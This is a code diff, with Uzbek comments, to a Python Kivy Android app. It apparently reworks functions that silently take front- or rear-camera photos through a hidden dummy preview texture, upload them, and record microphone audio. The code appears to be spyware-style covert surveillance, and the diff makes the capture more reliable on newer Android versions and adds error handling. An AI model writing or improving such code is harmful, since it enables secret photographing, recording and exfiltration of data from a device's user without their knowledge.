@@ -132,12 +132,22 @@ def take_photo_camera(camera_id, loop):
         Camera = autoclass('android.hardware.Camera')
         SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
         FileOutputStream = autoclass('java.io.FileOutputStream')
+        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+
         cam_name = "selfie" if camera_id == 1 else "capture"
-        filepath = "/sdcard/" + cam_name + ".jpg"
+        # Android 10+ da /sdcard/ o'rniga app private papkasini ishlatamiz
+        ext_dir = activity.getExternalFilesDir(None).getAbsolutePath()
+        filepath = ext_dir + "/" + cam_name + ".jpg"
+
         camera = Camera.open(camera_id)
-        texture = SurfaceTexture(camera_id + 10)
-        camera.setPreviewTexture(texture)
+        # Har doim yangi texture ID ishlatamiz (conflict bo'lmasin)
+        texture = SurfaceTexture(camera_id * 100 + 1)
+        try:
+            camera.setPreviewTexture(texture)
+        except Exception:
+            pass  # Ba'zi qurilmalarda preview kerak emas
         camera.startPreview()
+
         done = [False]
         path = [None]
 
@@ -146,21 +156,28 @@ def take_photo_camera(camera_id, loop):
             __javacontext__ = 'app'
             @java_method('([BLandroid/hardware/Camera;)V')
             def onPictureTaken(self, data, cam):
-                fos = FileOutputStream(filepath)
-                fos.write(data)
-                fos.close()
-                cam.release()
-                path[0] = filepath
-                done[0] = True
+                try:
+                    fos = FileOutputStream(filepath)
+                    fos.write(data)
+                    fos.close()
+                    path[0] = filepath
+                except Exception as ex:
+                    print("Saqlash xatoligi: " + str(ex))
+                finally:
+                    cam.release()
+                    done[0] = True
 
         camera.takePicture(None, None, PicCb())
         for _ in range(30):
             if done[0]:
                 break
             time.sleep(0.3)
+
         if path[0] and os.path.exists(path[0]):
             asyncio.run_coroutine_threadsafe(upload_file(path[0], "photo"), loop)
             status[0] = "Rasm olindi, yuborilmoqda..."
+        else:
+            status[0] = "Kamera: rasm olinmadi"
     except Exception as e:
         status[0] = "Kamera xatolik: " + str(e)
 
@@ -173,7 +190,12 @@ def record_audio(loop):
         AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
         OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
         AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')
-        filepath = "/sdcard/audio.m4a"
+        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+
+        # Android 10+ da app private papkasini ishlatamiz
+        ext_dir = activity.getExternalFilesDir(None).getAbsolutePath()
+        filepath = ext_dir + "/audio.m4a"
+
         recorder = MediaRecorder()
         recorder.setAudioSource(AudioSource.MIC)
         recorder.setOutputFormat(OutputFormat.MPEG_4)
